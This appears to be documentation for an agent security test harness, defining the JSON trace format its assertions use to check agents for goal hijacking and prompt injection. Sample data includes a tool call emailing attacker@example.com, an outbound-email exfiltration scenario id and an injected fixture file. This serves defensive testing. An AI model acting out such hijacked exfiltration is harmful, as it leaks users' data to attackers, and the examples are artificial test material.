# Trace Format

The Agent Security Regression Harness evaluates agent behavior through execution traces.

A trace is a JSON-compatible object that records what happened during a scenario run. The harness does not require a specific agent framework. Instead, live targets and adapters must return trace-shaped JSON that the assertion engine can evaluate.

## Top-level shape

A trace contains three top-level lists:

```json
{
  "messages": [],
  "tool_calls": [],
  "events": []
}
```

All three fields are required by convention and should be present even when empty.

## Messages

`messages` records conversation-like activity.

Example:

```json
{
  "messages": [
    {
      "role": "user",
      "content": "Summarize the document."
    },
    {
      "role": "assistant",
      "content": "Here is the summary."
    }
  ]
}
```

Message fields:

| Field | Type | Description |
|---|---:|---|
| `role` | string | Message role, such as `user`, `assistant`, `system`, or `tool`. |
| `content` | string | Message text. |

Assertions may inspect messages for secret disclosure, goal drift, or other policy violations.

## Tool calls

`tool_calls` records tools the agent attempted to call.

Example:

```json
{
  "tool_calls": [
    {
      "name": "send_email",
      "arguments": {
        "to": "attacker@example.com",
        "subject": "Requested information"
      }
    }
  ]
}
```

Tool call fields:

| Field | Type | Description |
|---|---:|---|
| `name` | string | Preferred tool name field. |
| `tool` | string | Alternative tool name field accepted by the harness. |
| `tool_name` | string | Alternative tool name field accepted by the harness. |
| `arguments` | object | Tool arguments supplied by the agent. |

The harness currently recognizes tool names from these fields, in order:

1. `name`
2. `tool`
3. `tool_name`

A tool call should use `name` unless an adapter is translating from a framework that already uses a different field.

### MCP tool calls

MCP tool names are only unique within an MCP server, so MCP adapters should use
a canonical source-qualified tool name:

```json
{
  "name": "mcp/filesystem_fixture/delete_file",
  "arguments": {
    "path": "notes.txt"
  },
  "mcp_server_id": "filesystem_fixture",
  "mcp_tool_name": "delete_file",
  "mcp_method": "tools/call",
  "trust": "untrusted",
  "mcp_transport": "stdio"
}
```

Scenarios that deny MCP tools should use the canonical `mcp/<server_id>/<tool>`
name in `expected.denied_tools`. The same holds for `action` in an
[`approval_required`](assertions/approval_required.md) assertion: a bare tool name
never matches an MCP call, so the assertion returns `not_run` instead of failing.

### MCP lifecycle events

MCP adapters should record protocol activity that affects the agent but is not a
plain tool call in `events`. The initial normalized event set is:

| Event type | Required identity | Notes |
|---|---|---|
| `mcp_resource_read` | `server_id`, `uri` | Records a resource returned across the MCP trust boundary. |
| `mcp_prompt_get` | `server_id`, `mcp_prompt_name` | Records a prompt retrieved from an MCP server. |
| `mcp_tool_result` | `server_id`, `mcp_tool_name` | Records a tool result or tool execution error. |
| `mcp_policy_decision` | `server_id`, `decision` | Records an adapter allow/deny decision. |

The adapter may also emit connection and capability events such as
`mcp_connection_initialized`, `mcp_capabilities_negotiated`,
`mcp_tools_discovered`, `mcp_client_request`, and `mcp_connection_closed`.

MCP events should preserve the configured server identity and trust metadata.
For tool results, `name` should use the same canonical
`mcp/<server_id>/<tool>` format as `tool_calls`.

Example MCP event trace:

```json
{
  "events": [
    {
      "type": "mcp_resource_read",
      "server_id": "filesystem_fixture",
      "trust": "untrusted",
      "transport": "stdio",
      "uri": "file:///workspace/fixtures/injected.md",
      "mime_type": "text/markdown",
      "content_truncated": true,
      "mcp_method": "resources/read"
    },
    {
      "type": "mcp_prompt_get",
      "server_id": "prompt_server",
      "trust": "third_party",
      "mcp_prompt_name": "summarize_document",
      "mcp_method": "prompts/get"
    },
    {
      "type": "mcp_tool_result",
      "name": "mcp/filesystem_fixture/read_file",
      "server_id": "filesystem_fixture",
      "mcp_tool_name": "read_file",
      "trust": "untrusted",
      "is_error": false,
      "content_truncated": false,
      "mcp_method": "tools/call"
    },
    {
      "type": "mcp_policy_decision",
      "server_id": "filesystem_fixture",
      "trust": "untrusted",
      "method": "tools/call",
      "decision": "deny",
      "reason": "tool is denied by scenario policy"
    }
  ]
}
```

## Events

`events` records structured runtime facts that are not plain messages or tool calls.

Example:

```json
{
  "events": [
    {
      "type": "goal",
      "id": "summarize_document"
    }
  ]
}
```

Event fields:

| Field | Type | Description |
|---|---:|---|
| `type` | string | Event category. |
| `id` | string | Stable identifier for the event. |

Additional event fields may be included when useful for evidence, debugging, or future assertions.

## Goal events

Goal events describe the goal the agent actually followed during execution.

Goal event shape:

```json
{
  "type": "goal",
  "id": "summarize_document"
}
```

The `id` should be a stable, snake_case identifier.

Example expected goal in a scenario:

```yaml
assertions:
  - type: goal_integrity
    expected_goal: summarize_document
```

Example passing trace event:

```json
{
  "type": "goal",
  "id": "summarize_document"
}
```

Example failing trace event:

```json
{
  "type": "goal",
  "id": "send_email"
}
```

Goal matching should use strict equality. Substring matching should not be used for security assertions because it can create false positives.

## Trust-boundary events

Targets may record when untrusted context was observed and treated as data.

Example:

```json
{
  "type": "untrusted_context_received",
  "policy": "treated as data, not instruction"
}
```

This is useful evidence for hardened agents that preserve the user's goal while refusing to follow injected instructions.

## Example complete trace

```json
{
  "messages": [
    {
      "role": "user",
      "content": "Summarize the document."
    },
    {
      "role": "assistant",
      "content": "Here is the summary."
    }
  ],
  "tool_calls": [],
  "events": [
    {
      "type": "goal",
      "id": "summarize_document"
    },
    {
      "type": "untrusted_context_received",
      "policy": "treated as data, not instruction"
    }
  ]
}
```

## Adapter responsibility

Adapters and live HTTP targets are responsible for converting framework-specific behavior into this trace format.

For live HTTP targets, the target receives scenario input and returns trace JSON.

Request body:

```json
{
  "scenario_id": "goal_hijack.outbound_email_exfiltration_001",
  "input": {
    "user_message": "Summarize the document.",
    "context": []
  }
}
```

Response body:

```json
{
  "messages": [],
  "tool_calls": [],
  "events": []
}
```

The assertion engine evaluates only the returned trace and the scenario policy.
